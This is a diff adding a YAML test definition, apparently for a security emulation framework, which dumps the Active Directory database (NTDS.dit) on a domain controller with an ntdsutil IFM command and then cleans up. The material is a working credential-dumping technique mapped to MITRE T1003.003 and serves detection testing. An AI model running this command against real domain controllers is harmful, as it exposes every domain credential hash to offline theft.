@@ -1,0 +1,35 @@
+api_version: "2.0"
+name: Dump Active Directory Database with NTDSUtil
+description: |
+    This test is intended to be run on a domain Controller.
+
+    The Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability
+    uses the "IFM" or "Install From Media" backup functionality that allows Active Directory restoration or installation of
+    subsequent domain controllers without the need of network-based replication.
+
+    Upon successful completion, you will find a copy of the ntds.dit file in the C:\Windows\Temp directory.
+args:
+    - name: output_folder
+      type: path
+      default: C:\Windows\Temp\ntds_T1003
+uuid: 2364e33d-ceab-4641-8468-bfb1d7cc2723
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1003: OS Credential Dumping'
+    subtechniques:
+        - 'T1003.003: NTDS'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: dump-active-directory-database-with-ntdsutil
+      inline: |
+        mkdir {{.Args.output_folder}}
+        ntdsutil "ac i ntds" "ifm" "create full {{.Args.output_folder}}" q q
+      executor: command_prompt
+      cleanup:
+        inline: |
+            rmdir /q /s {{.Args.output_folder}} >nul 2>&1
+        executor: command_prompt
